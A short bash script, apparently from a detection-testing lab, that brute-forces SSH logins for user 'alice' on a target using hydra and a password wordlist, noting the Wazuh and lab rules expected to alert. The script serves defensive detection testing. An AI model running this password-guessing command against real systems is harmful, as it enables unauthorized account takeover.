#!/bin/bash
# T1110.001 Password Guessing against a real account, ending in a successful login.
# Expected detections: Wazuh 5760, lab rules 100100 and 100102 (success after brute force).
source "$(dirname "$0")/lib.sh"
step "Brute forcing user alice on $TARGET"
hydra -l alice -P /attacks/wordlists/passwords.txt -t 4 -f "ssh://$TARGET_IP" || true
